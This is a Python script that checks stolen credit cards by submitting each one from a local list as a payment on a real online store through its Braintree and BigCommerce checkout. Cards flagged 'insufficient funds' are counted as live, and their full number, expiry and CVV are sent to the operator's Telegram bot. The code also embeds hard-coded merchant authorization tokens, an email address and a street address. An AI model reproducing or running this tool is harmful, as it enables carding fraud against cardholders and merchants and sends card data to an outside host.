import os,webbrowser
webbrowser.open('https://t.me/ModcaTheLost')
try:
	import requests
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install requests')
	
try:
	from cfonts import render  
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install python-cfonts')
	
try:
	from fake_useragent import UserAgent
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install fake_useragent')
import requests,time,webbrowser,json,os,sys,re,user_agent,random
from cfonts import render, say
import random,string,user_agent,base64
from fake_useragent import UserAgent
#from bin_info_v1 import bin_info

try:
	import requests
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install requests')
try:
	from user_agent import generate_user_agent
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install user_agent')
	
try:
	from cfonts import render  
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install python-cfonts')
	
try:
	 import user_agent
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install user_agent')

try:
	from getuseragent import UserAgent
except ModuleNotFoundError:
	print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
	os.system('pip install getuseragent')
	from getuseragent import UserAgent
	
user_agent = UserAgent('ios').Random()
		
r = requests.session()
	
r.follow_redirects = True
	
r.verify = False


Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
w = '\033[2;37m'
y = '\033[1;34m' 


import sys,time,os
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐚𝐭𝐢𝐨𝐧... ")
os.system('clear')            
from cfonts import render  
#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")          

O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple


tok = input('Enter Your Token : ')
ID = input('Enter Your ID : ')

file=open('Modca.txt',"+r")
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
    	mm = mm
    elif '0' not in mm:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    if "20" not in yy:
        yy = f'20{yy}'
    else:
    	yy = yy
    #time.sleep(14)
    start_time = time.time()
	
    headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI3MTI4MDQsImp0aSI6IjkxZGI3NjQwLWNjNzEtNGIzNS04ZTNjLTI2MGIwNWM0NWVkNCIsInN1YiI6InloZmsyMmg4amI5a3FubjYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InloZmsyMmg4amI5a3FubjYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiZmlyZXBsYWNlYmxvd2Vyc29ubGluZWNvbV9pbnN0YW50In19.rmh351UpeCc0M4-wCIFFMnq1dFtDZY_mF3c2QIIW6wCENbvlvNcFLIhfsYji3M17qqrP0L6wCxGN0sdD7BCtkw',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://fireplaceblowersonline.com',
	    'referer': 'https://fireplaceblowersonline.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user_agent,
	}
	
    json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'f8cbe6ea-2d30-4c00-b18e-b57ea833a37d',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'Salah Berges',
	                'billingAddress': {
	                    'countryCodeAlpha2': 'US',
	                    'locality': 'MANSFIELD',
	                    'countryName': 'United States',
	                    'postalCode': '76063',
	                    'streetAddress': '303 N Walnut Creek Dr',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
    token = (response.json()['data']['tokenizeCreditCard']['token'])

	
    headers = {
	    'Accept': 'application/json',
	    'Accept-Language': 'en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7',
	    'Authorization': 'JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjI2MzAxNjAsIm5iZiI6MTcyMjYyNjU2MCwiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDAxMjMzNzg5LCJqdGkiOiI1Yjg3MTUzNi00YTE2LTRjYmEtOTM5Ny0xMjI0MjFiY2ZmZDYiLCJpYXQiOjE3MjI2MjY1NjAsImRhdGEiOnsic3RvcmVfaWQiOiIxMDAxMjMzNzg5Iiwib3JkZXJfaWQiOiIxNjYwOTYiLCJhbW91bnQiOjM1MTAwLCJjdXJyZW5jeSI6IlVTRCIsInN0b3JlX3VybCI6Imh0dHBzOi8vZmlyZXBsYWNlYmxvd2Vyc29ubGluZS5jb20iLCJmb3JtX2lkIjpudWxsfX0.r-p4bfQ8uAQKhvCOp1RtbuwLU3xPdJonU50w125T42w',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    'Origin': 'https://fireplaceblowersonline.com',
	    'Referer': 'https://fireplaceblowersonline.com/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'cross-site',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
    json_data = {
	    'customer': {
	        'customer_group': {
	            'name': 'RETAIL - GUEST',
	        },
	        'geo_ip_country_code': 'DZ',
	        'session_token': '637f2c51313b3fad303eda8ae8cbee2216191c98',
	    },
	    'notify_url': 'https://internalapi-1001233789.mybigcommerce.com/internalapi/v1/checkout/order/166096/payment',
	    'order': {
	        'billing_address': {
	            'city': 'MANSFIELD',
	            'country_code': 'US',
	            'country': 'United States',
	            'first_name': 'Salah',
	            'last_name': 'Berges',
	            'state_code': 'TX',
	            'state': 'Texas',
	            'street_1': '303 N Walnut Creek Dr',
	            'zip': '76063',
	            'email': 'fcodzilla@gmail.com',
	        },
	        'coupons': [],
	        'currency': 'USD',
	        'id': '166096',
	        'items': [
	            {
	                'code': 'bec648f0-0c88-442a-83b0-0d28b4c4b873',
	                'variant_id': 1435,
	                'name': 'BLOTBLDVSC Signature Command Dual Blower Kit | Majestic & Monessen',
	                'price': 39000,
	                'unit_price': 39000,
	                'quantity': 1,
	                'sku': 'BLOTBLDVSC-KT',
	            },
	        ],
	        'shipping': [
	            {
	                'method': 'Free Shipping (Time Varies. Our Choice of Carrier)',
	            },
	        ],
	        'shipping_address': {
	            'city': 'MANSFIELD',
	            'country_code': 'US',
	            'country': 'United States',
	            'first_name': 'Salah',
	            'last_name': 'Berges',
	            'state_code': 'TX',
	            'state': 'Texas',
	            'street_1': '303 N Walnut Creek Dr',
	            'zip': '76063',
	        },
	        'token': '18a161427f28b209c79f78ae8e48d16a',
	        'totals': {
	            'grand_total': 35100,
	            'handling': 0,
	            'shipping': 0,
	            'subtotal': 39000,
	            'tax': 0,
	        },
	    },
	    'payment': {
	        'device_info': '{"device_session_id":"d2c7067a0c1a97c6b13ec0ac7aef5134","fraud_merchant_id":null,"correlation_id":"206bb92dfd6806c38d3da153647e8e6d"}',
	        'gateway': 'braintree',
	        'notify_url': 'https://internalapi-1001233789.mybigcommerce.com/internalapi/v1/checkout/order/166096/payment',
	        'vault_payment_instrument': False,
	        'method': 'credit-card',
	        'credit_card_token': {
	            'token': token,
	        },
	    },
	    'store': {
	        'hash': '298hrtwvc5',
	        'id': '1001233789',
	        'name': 'FireplaceBlowersOnline.com',
	    },
	}
	
    response = requests.post('https://payments.bigcommerce.com/api/public/v1/orders/payments', headers=headers, json=json_data)
    
    #print(P,'->>',response.json()['errors'][0]['code'])
    if 'insufficient_funds' in response.text:
    	print(f'{P} ->> AρρтσνєD ✅  ')
    	requests.post(f"""https://api.telegram.org/bot{tok}/sendmessage?chat_id={ID}&text=
    	Hєℓℓє Mу Mαѕтєя ~ @B_6_Q [ Nєω Hιтѕ ] 🍡
	    	CαяD : {n}|{mm}|{yy}|{cvc}
    	
        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~ """)
    	
    elif 'call_issuer' in response.text:
    	print(f'{P} ->> Cαℓℓ Iѕѕυєя ❌  ')
    	
    elif 'expired_card' in response.text:
    	print(f'{P} ->> EχριяєD CαяD ❌  ')
    	
    elif 'pickup_card' in response.text:
    	print(f'{P} ->> Pιcρυρ CαяD ❌  ')
    elif 'transaction_declined' in response.text:
    	print(f'{P} ->> TяαиѕαcTισи DєcℓιиєD ❌  ')
    	
    elif 'card_declined' in response.text:
    	print(f'{P} ->> CαяD Dєcℓιиє ❌  ')
    	
    elif 'invalid_number' in response.text:
    	print(f'{P} ->> IиναℓιD NυмвєR ❌  ')
    	
    elif 'invalid_request_error' in response.text:
    	print(f'{P} ->> Eяяσя ❌  ')
 
    else:
    	print(response.json())
    time.sleep(10)